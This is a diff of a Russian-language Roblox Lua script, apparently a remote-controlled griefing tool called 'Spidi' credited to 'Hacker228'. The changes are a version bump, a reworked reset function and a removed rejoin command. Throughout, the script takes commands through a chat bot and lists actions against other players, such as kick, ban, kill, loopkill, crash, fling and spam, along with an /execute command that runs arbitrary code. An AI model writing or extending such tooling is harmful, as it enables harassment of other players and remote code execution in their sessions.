@@ -60,8 +60,6 @@ local active = {}
 local stunned = {}
 local spinning = {}
 local cd = {}
-local kicked = {}
-local banned = {}
 
 local function addUser(p)
     if not scriptUsers[p.UserId] then
@@ -122,8 +120,8 @@ local function getAll()
     return list
 end
 
--- ==================== МГНОВЕННЫЙ /rm ====================
-local function stopAll()
+-- ==================== ПОЛНЫЙ СБРОС ====================
+local function fullReset()
     -- Останавливаем все активные процессы
     for _, d in pairs(active) do
         if d.conn then pcall(d.conn.Disconnect, d.conn) end
@@ -138,17 +136,12 @@ local function stopAll()
     spinning = {}
     
     -- Снимаем оглушения
-    for _, d in pairs(stunned) do
-        if d and d.speed and d.jump then
-            -- Данные уже не нужны
-        end
-    end
     stunned = {}
     
     -- Сбрасываем КД
     cd = {}
     
-    -- Снимаем заморозку и возвращаем скорость
+    -- Возвращаем всех игроков в норму
     for _, p in pairs(Players:GetPlayers()) do
         if p.Character then
             local hrp = p.Character:FindFirstChild("HumanoidRootPart")
@@ -161,6 +154,8 @@ local function stopAll()
                 hum.WalkSpeed = 16
                 hum.JumpPower = 50
                 hum.Sit = false
+                hum.Health = 100
+                hum.MaxHealth = 100
             end
             -- Удаляем BodyVelocity
             for _, v in pairs(p.Character:GetChildren()) do
@@ -186,7 +181,7 @@ local function stopAll()
         cam.CameraType = Enum.CameraType.Custom
     end
     
-    send("🛑 <b>ВСЕ ПРОЦЕССЫ ОСТАНОВЛЕНЫ!</b>\n✅ Память обнулена до заводских настроек")
+    send("🛑 <b>ПОЛНЫЙ СБРОС!</b>\n✅ Все эффекты убраны\n✅ Все игроки восстановлены\n✅ Память обнулена")
 end
 
 -- ==================== МУЗЫКА ====================
@@ -378,17 +373,17 @@ local function handle(cmd, args)
     local info = "👤 Hacker228\n🔗 https://www.roblox.com/games/"..game.PlaceId
     
     if cmd == "start" then
-        send("✅ Spidi v15 активирован!\n"..info)
+        send("✅ Spidi v16 активирован!\n"..info)
         return
     end
     
     if cmd == "rm" then
-        stopAll()
+        fullReset()
         return
     end
     
     if cmd == "help" then
-        send("📋 <b>КОМАНДЫ:</b>\n/players - пользователи\n/pc - все игроки\n/rm - стоп процессы\n/kick [ник] [причина]\n/ban [ник] [причина]\n/unban [ник]\n/kill [ник]\n/freeze [ник]\n/unfreeze [ник]\n/fly [ник]\n/unfly [ник]\n/crash [ник]\n/fling [ник]\n/teleport [ник1] [ник2]\n/bring [ник1] [ник2]\n/loopkill [ник]\n/stun [ник]\n/jump [ник]\n/spin [ник] [скорость]\n/unspin [ник]\n/explode [ник]\n/des [ник]\n/warp [ник] [1-10]\n/unwarp [ник]\n/music [айди]\n/unmusic\n/say [ник] [текст]\n/spam [ник] [кол-во] [текст]\n/message [ник] [текст]\n/announce [текст]\n/players\n/pc\n/server\n/rejoin\n/execute [код]\n/setfps\n/help")
+        send("📋 <b>КОМАНДЫ:</b>\n/players - пользователи\n/pc - все игроки\n/rm - полный сброс\n/kick [ник] [причина]\n/ban [ник] [причина]\n/unban [ник]\n/kill [ник]\n/freeze [ник]\n/unfreeze [ник]\n/fly [ник]\n/unfly [ник]\n/crash [ник]\n/fling [ник]\n/teleport [ник1] [ник2]\n/bring [ник1] [ник2]\n/loopkill [ник]\n/stun [ник]\n/jump [ник]\n/spin [ник] [скорость]\n/unspin [ник]\n/explode [ник]\n/des [ник]\n/warp [ник] [1-10]\n/unwarp [ник]\n/music [айди]\n/unmusic\n/say [ник] [текст]\n/spam [ник] [кол-во] [текст]\n/message [ник] [текст]\n/announce [текст]\n/players\n/pc\n/server\n/execute [код]\n/setfps\n/help")
         return
     end
     
@@ -409,12 +404,6 @@ local function handle(cmd, args)
         local count = 0
         for _, p in pairs(Players:GetPlayers()) do if scriptUsers[p.UserId] then count = count + 1 end end
         send("🖥️ Сервер: "..name.."\nID: "..game.PlaceId.."\nИгроков: "..#Players:GetPlayers().."\nSpidi: "..count)
-        return
-    end
-    
-    if cmd == "rejoin" then
-        send("🔄 Перезаход...")
-        TeleportService:Teleport(game.PlaceId, Players.LocalPlayer)
         return
     end
     
@@ -730,7 +719,7 @@ local function poll()
                     local msg = upd.message
                     if not CHAT_ID then
                         CHAT_ID = msg.chat.id
-                        send("✅ Spidi v15 запущен!\n👤 Hacker228")
+                        send("✅ Spidi v16 запущен!\n👤 Hacker228")
                     end
                     local text = msg.text
                     if text:sub(1,1) == "/" then
@@ -757,5 +746,5 @@ end)
 wait(3)
 getChat()
 if CHAT_ID then
-    send("✅ Spidi v15 запущен!\n👤 Hacker228\n/players - пользователи\n/pc - все игроки\n/rm - стоп процессов")
+    send("✅ Spidi v16 запущен!\n👤 Hacker228\n/players - пользователи\n/pc - все игроки\n/rm - полный сброс")
 end
